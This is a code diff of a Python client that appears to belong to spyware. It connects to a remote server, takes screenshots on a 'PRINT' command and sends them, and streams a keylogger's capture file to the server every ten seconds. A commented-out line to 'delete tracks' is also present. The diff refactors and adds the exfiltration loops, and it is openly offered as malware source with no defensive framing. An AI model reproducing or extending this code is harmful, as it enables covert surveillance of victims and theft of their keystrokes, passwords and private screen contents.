@@ -14,16 +14,13 @@ def send_file(filename, sock):
             sock.sendall(data)
 
             break
-            # WAIT 10 SECONDS TO SEND THE FILE AGAIN
-            #time.sleep(10)
-    print('sai do while')
-
+            
 
 def handle_prt_sc(destination_address, destination_port):
     target_file = '/home/michel/pessoal/'
     screenshot = 'screenshot-'
     n = 0
-    end_file = 'END_FILE'
+    EOF = 'END_FILE'
 
     # CREATE SOCKET
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,18 +30,23 @@ def handle_prt_sc(destination_address, destination_port):
 
         while True:
             data = sock.recv(1024).decode('utf-8')
-            print('cliente recebeu: ', data)
 
             # TAKE AND SEND PRINT SCREEN
             if data == 'PRINT':
                 # change picture's name
-                new_file = target_file + screenshot + str(n) + ".jpg"  
+                filename = target_file + screenshot + str(n) + ".jpg"  
                 # take the print screen
-                os.system("scrot " + new_file)
+                os.system("scrot " + filename)
                 #send file
-                send_file(new_file, sock)
+                with open(filename, 'rb') as file:
+                    # READ FILE
+                    data = file.read()
+                    
+                    # SEND FILE TO SERVER
+                    sock.sendall(data)
+                
                 # send a marker to inform that the file its end
-                sock.send(end_file.encode('utf-8'))
+                sock.send(EOF.encode('utf-8'))
                 # delete tracks
                 #os.system("rm " + target_file)
                 n += 1
@@ -65,7 +67,17 @@ def handle_keylogger(destination_address, destination_port):
         sock.connect((destination_address, destination_port))
 
         while True:
-            send_file(target_file, sock)
+            # OPEN FILE TO READ
+            with open(target_file, 'rb') as file:
+                while True:
+                    # READ FILE
+                    data = file.read()
+
+                    # SEND FILE TO SERVER
+                    sock.sendall(data)
+
+                    # WAIT 10 SECONDS TO SEND THE FILE AGAIN
+                    time.sleep(10)
 
     finally:
         # CLOSES SOCKET
